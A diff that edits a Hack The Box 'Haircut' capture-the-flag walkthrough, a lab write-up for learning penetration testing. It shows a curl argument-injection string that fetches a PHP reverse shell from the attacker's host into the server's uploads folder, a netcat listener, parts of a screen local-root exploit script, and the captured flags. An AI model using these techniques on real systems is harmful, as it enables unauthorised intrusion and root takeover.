@@ -52,23 +52,11 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
 ```
 
-It seems like there’s a website. Let’s check it out!
+Here is the webpage.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Haircut/website.png?raw=true)
 
-It seems like there is nothing much on the website and the source page shows nothing special.
-
-```html
-<!DOCTYPE html>
-
-<title> HTB Hairdresser </title>
-
-<center> <br><br><br><br>
-<img src="bounce.jpg" height="750" width="1200" alt="" />
-<center>
-```
-
-Let’s run a `gobuster` scan then!
+There was nothing much to find on the website. Let’s run a `gobuster` scan to find some hidden directories.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Haircut]
@@ -78,7 +66,7 @@ Let’s run a `gobuster` scan then!
 ...
 ```
 
-Hmm.. there’s nothing much? Let’s add some extensions to the scan.
+Let’s add some extensions to the `gobuster` scan.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Haircut]
@@ -91,21 +79,17 @@ Hmm.. there’s nothing much? Let’s add some extensions to the scan.
 /exposed.php          (Status: 200) [Size: 446]                           ...
 ```
 
-It seems like there’s an interesting `/uploads` and `/exposed.php` directory!
-
 `/uploads` returned us `403 Forbidden` but `/exposed.php` returned something interesting!
 
 ![exposed_php](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Haircut/exposed_php.png?raw=true)
 
 # Exploit
 
-What happens when we click `Go`?
+On first glance, this looks like a possible command injection vulnerability.
 
 ![exposed_php_2](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Haircut/exposed_php_2.png?raw=true)
 
-It looks like the script is trying to `curl` something from the user specified location.
-
-Let’s try hosting our own webserver to host a reverse shell.
+It looks like the script is trying to `curl` something from the user specified location. Let’s try hosting our own webserver to host a PHP reverse shell.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Haircut]
@@ -120,17 +104,13 @@ Then we can grab the file by inputting `http://10.10.14.12/revshell.php`.
 
 ![curl](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Haircut/curl.png?raw=true)
 
-It seems like it didn’t work..
-
-Ah! We know that there’s an `/upload` folders, so what would happen if we save the file in that folder instead?
+It seems like it didn’t work. However, we know that there’s an `/upload` folders, so it might be possible if we save the file in that location instead using the `-o` flag for curl.
 
 ```bash
 http://10.10.14.12/revshell.php -o /var/www/html/uploads/revshell.php
 ```
 
->   Since we know that the webpage is using `curl` command, we can specify `-o` to tell the server where to put the file!
-
-Now, we can start a netcat listener and execute the `revshell.php` using `curl http://10.10.10.24/uploads/revshell.php` on our local machine!
+Now, we can start a netcat listener and execute the `revshell.php` using `curl http://10.10.10.24/uploads/revshell.php` on our local machine.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Haircut]
@@ -171,9 +151,7 @@ $ find / -perm -4000 -type f 2>/dev/null
 ...
 ```
 
-There was a weirdly specific file called `screen-4.5.9` which prompted me to do some research.
-
-Thankfully, there was a Local Privilege Escalation script on [ExploitDB](https://www.exploit-db.com/exploits/41154).
+There was a weirdly specific file called `screen-4.5.9` which is vulnerable to this script on [ExploitDB](https://www.exploit-db.com/exploits/41154).
 
 ```bash
 #!/bin/bash
@@ -220,9 +198,7 @@ screen -ls # screen itself is setuid, so...
 /tmp/rootshell
 ```
 
-It seems like the exploit code is trying to do 3 different things. 
-
-Therefore, I decided to split this script and compile it on my local machine before hosting it on a local webserver.
+It seems like the exploit code is trying to do 3 different things. We will have to split this script into 3 parts and compile it before hosting it on a local webserver.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Haircut]
@@ -296,9 +272,6 @@ No Sockets found in /tmp/screens/S-www-data.
 
 whoami
 root
-cd /home
-ls
-maria
 cat /home/maria/user.txt
 9a42c4b5a80e862e7f007cc468c035ce
 cat /root/root.txt
